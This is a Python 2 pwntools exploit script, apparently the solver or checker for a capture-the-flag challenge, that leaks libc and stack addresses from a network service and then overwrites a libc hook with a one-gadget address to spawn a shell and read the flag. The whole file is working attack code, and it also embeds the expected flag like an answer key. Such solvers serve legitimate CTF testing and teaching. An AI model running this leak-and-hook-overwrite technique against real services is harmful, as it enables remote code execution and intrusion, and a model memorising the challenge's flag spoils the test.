#!/usr/bin/env python2
from pwn import *
import sys

HOST = '127.0.0.1'
PORT = 12345
FLAG = 'midnight{0x4141414141414141}'

BASE = 0x7a81b
BUFF = 0xb0
HOOK = 0x3c4b10
GADG = 0xf02a4

DEBUG = False

host = HOST
if len(sys.argv) > 1:
	host = sys.argv[1]

port = PORT
if len(sys.argv) > 2:
	port = sys.argv[2]

if len(sys.argv) > 3:
	DEBUG = True

while True:
	io = remote(host, port)

	io.recvuntil(': ')
	io.sendline('a'*40)
	io.recvuntil(': ')

	leak = io.recvline()[:6]
	leak = u64(leak[::-1]+'\x00\x00')
	libc = leak - BASE

	if (libc & 0xfff) != 0x0:
		io.close()
		continue

	if DEBUG == True:
		log.info('leak: 0x%012x' % leak)
		log.info('libc: 0x%012x' % libc)

	io.recvuntil(': ')
	io.sendline('a'*128)
	io.recvuntil(': ')

	leak = io.recvline()[:6]
	leak = u64(leak[::-1]+'\x00\x00')
	stack = leak - BUFF

	if DEBUG == True:
		log.info('leak: 0x%012x' % leak)
		log.info('stack: 0x%012x' % stack)

	io.recvuntil(': ')
	io.sendline('a'*8+p64(0)+'b'*136+p64(libc+HOOK))
	io.recvline()

	io.recvuntil(': ')
	io.sendline(p64(libc+GADG))

	if DEBUG == True:

		log.success('got shell?')
		io.sendline('id')
		io.info(io.recvline().strip())

		io.interactive()

	else:

		io.sendline('cat flag')
		if io.recvline().strip() != FLAG:
			log.failure('fail')
			sys.exit(-1)
		else:
			log.success('pass')
			
	sys.exit(0)